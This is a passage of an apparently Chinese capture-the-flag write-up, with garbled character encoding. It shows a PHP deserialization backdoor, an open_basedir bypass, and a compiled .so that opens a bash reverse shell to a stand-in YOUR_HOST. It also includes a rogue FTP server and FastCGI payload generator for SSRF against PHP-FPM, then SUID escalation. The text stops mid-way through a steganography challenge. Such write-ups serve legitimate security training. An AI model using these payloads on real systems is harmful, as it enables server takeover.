class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°äº†å¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;count&quot;</span>;i:<span class="number">9223372036854775806</span>;&#125;</span><br></pre></td></tr></table></figure><p>å°†è½½è·æ‹¼æ¥åˆ° <code>$_COOKIE[&quot;data&quot;]</code> ä¸­å³å¯åˆ°è¾¾ <code>eval($_GET[&quot;backdoor&quot;]);</code>ï¼Œä»è€Œæ‰§è¡Œä¸€éƒ¨åˆ†æŒ‡ä»¤ã€‚æ‰§è¡Œ <code>phpinfo()</code> å¯ä»¥å‘ç°é¶æœºæ‰€ä½¿ç”¨çš„æ˜¯ PHP 7.4.16ï¼Œä¸”æœ‰å¦‚ä¸‹ disable_functions å’Œ disable_classesã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br><span class="line"></span><br><span class="line">Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br></pre></td></tr></table></figure><h4 id="FTP-SSRF-æ”»å‡»-PHP-FPM-FastCGI"><a href="#FTP-SSRF-æ”»å‡»-PHP-FPM-FastCGI" class="headerlink" title="FTP SSRF æ”»å‡» PHP-FPM/FastCGI"></a>FTP SSRF æ”»å‡» PHP-FPM/FastCGI</h4><blockquote><p><a href="https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></p></blockquote><p>åœ¨ phpinfo ä¸­å¯ä»¥å‘ç°è®¾ç½®äº† open_basedirï¼Œå› æ­¤ç¨å¾®ç”¨ <code>chdir()</code> ä¸ <code>ini_set()</code> ç»„åˆæ¥ç»•è¿‡ä¸€ä¸‹å¯ä»¥å¾—åˆ°å¦‚ä¸‹è½½è·æ¥è¯»åˆ° nginx çš„é…ç½®æ–‡ä»¶ï¼Œä»è€Œå¯ä»¥å¾—åˆ° FastCGI çš„ç«¯å£ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;mkdir(%27h3x%27);chdir(%27h3x%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);echo file_get_contents(&#39;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># pass PHP scripts to FastCGI server</span><br><span class="line">#</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9001;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html&#x2F;$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹ä»£ç ç¼–è¯‘å‡ºåå¼¹ shell çš„æ¶æ„ so æ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_HOST/3255 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ä½¿ç”¨å¦‚ä¸‹çš„è½½è·å°†ç¼–è¯‘å¥½çš„æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(<span class="string">&#x27;http://YOUR_HOST/hpdoger.so&#x27;</span>, <span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);print_r(scandir(<span class="string">&#x27;/tmp&#x27;</span>));</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ—¶å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; hpdoger.so )</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæ¶æ„çš„ FTP å®¢æˆ·ç«¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket <span class="keyword">as</span> Socket</span><br><span class="line">socket = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)</span><br><span class="line">socket.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))  <span class="comment"># Bind socket to FTP port</span></span><br><span class="line">socket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">connection, address = socket.accept()</span><br><span class="line">connection.send(<span class="string">b&#x27;220 Welcome to py.evil.lemonprefect.cn\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;331 Give me your password\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;230 Fake Login Successful\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;200 Switch to Binary mode KORA\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;550 File Size?\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Fine\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;227 Now Enter Extended Passive Mode (127,0,0,1,0,9001) Aha\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Actually No File\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;221 Give me five and a reflect shell\n&#x27;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‚è€ƒä¸­çš„ä»£ç ç”Ÿæˆ payloadã€‚</p><blockquote><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$paramsRequest</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stdin</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span> . urlencode(<span class="variable">$request</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)</span><br><span class="line">            . chr(<span class="variable">$type</span>)</span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$nlen</span> &lt; <span class="number">128</span> ? chr(<span class="variable">$nlen</span>) : chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$vlen</span> &lt; <span class="number">128</span> ? <span class="variable">$nvpair</span> . chr(<span class="variable">$vlen</span>) : <span class="variable">$nvpair</span> . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">// PHP file path</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span> . basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> . <span class="string">&#x27;?&#x27;</span> . <span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;  <span class="comment">// import evil hpdoger.so from /tmp</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span> =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span> =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9001&#x27;</span>,  <span class="comment">// Fast_CGI Port</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>æ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;$file&#x3D;$_GET[&#39;file&#39;];$data&#x3D;$_GET[&#39;data&#39;];file_put_contents($file, $data);</span><br><span class="line">&amp;file&#x3D;ftp:&#x2F;&#x2F;evil@YOUR_HOST&#x2F;evil&amp;data&#x3D;GENERATED_DATA_HERE</span><br></pre></td></tr></table></figure><p>è¿è¡Œå†™å¥½çš„æ¶æ„ FTP æœåŠ¡ç«¯ï¼Œç›‘å¬åœ¨æ¶æ„ so ä¸­è®¾å®šçš„ç«¯å£ã€‚å°†è½½è·æ‹¼æ¥åå‘é€åå¯ä»¥åœ¨ç›‘å¬ç«¯å£å¤„å¾—åˆ°åå¼¹çš„ shellã€‚</p><p>ä½¿ç”¨ <code>find /usr/local/bin -perm -u=s -type f 2&gt;/dev/null</code> æŸ¥åˆ° PHP å…·æœ‰ suidï¼Œå› æ­¤ç›´æ¥ä½¿ç”¨ PHP çš„äº¤äº’ shell å°è¯•è·å– flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@1f3072aea021:~/html$ find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">&lt; find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/php</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1620049443407/2dd7c47cdc393ff1db87508c1ea764be60013542.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d0a13137-6a17-408a-8298-16b816f34806&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å†¬å¥¥ä¼š-is-coming"><a href="#å†¬å¥¥ä¼š-is-coming" class="headerlink" title="å†¬å¥¥ä¼š_is_coming"></a>å†¬å¥¥ä¼š_is_coming</h3><p>é™„ä»¶ç»™å‡ºäº†ä¸€å¼ å›¾ç‰‡ï¼Œä½¿ç”¨ <code>binwalk -e</code> å¯ä»¥åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚å‹ç¼©åŒ…çš„å¤‡æ³¨ä¸­æœ‰ <code>eight numbers</code> çš„æç¤ºï¼Œä½†æ˜¯å‹ç¼©åŒ…æœ¬èº«å¹¶æ²¡æœ‰è¢«åŠ å¯†ï¼Œå› æ­¤çŒœæµ‹æ˜¯æœ‰éšå†™ã€‚ä½¿ç”¨ 010 editor æ‰“å¼€è§£å‹æ‰€å¾—çš„éŸ³é¢‘æ–‡ä»¶å¯åœ¨å…¶å°¾éƒ¨å‘ç°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†ğŸƒâœ…âŒ¨ğŸ”ªâ“ğŸš«ğŸğŸ™ƒğŸ”¬âœ‰ğŸ‘ğŸ˜†ğŸˆğŸ˜ğŸğŸ˜ğŸ˜ğŸ˜‚ğŸ˜ğŸ…ğŸ–ğŸâœ‰ğŸŒğŸŒªğŸğŸµâœ…ğŸšªâœ–â˜ƒğŸ‘£ğŸ‘‰â„¹ğŸ”ªğŸğŸ”„ğŸ‘£ğŸšªğŸ˜ğŸ‘£ğŸ’µğŸ…ğŸµğŸ”¬ğŸ›©ğŸ˜‡ğŸ–ğŸ–ğŸ…âœ…ğŸğŸ‘ŒğŸš¨ğŸ˜†ğŸ¤ğŸ…ğŸ¦“ğŸŒ¿ğŸ¦“ğŸ™ƒâœ–ğŸŒğŸ›©ğŸ˜‚ğŸ‘‘ğŸŒâ˜ƒğŸ˜‡ğŸ˜ğŸ›©ğŸš¹ğŸ˜€ğŸŒğŸˆğŸ’§ğŸ—’ğŸ—’</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯ emoji-aes åŠ å¯†ï¼Œä½†æ˜¯ä½¿ç”¨å†¬å¥¥ä¼šçš„æ—¥æœŸä½œä¸º key å°è¯•è§£å¯†å¹¶ä¸æˆåŠŸï¼Œå› æ­¤çŒœæµ‹åœ¨éŸ³é¢‘ä¸­ä»ç„¶æœ‰ä¿¡æ¯ã€‚ä½¿ç”¨ MP3stego é…åˆå†¬å¥¥ä¼šæ—¥æœŸ <code>20220204</code> ä½œä¸º key æ‰§è¡Œ <code>Decode.exe -X -P 20220204 .\encode.mp3</code> å¯æå–å‡ºå¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e 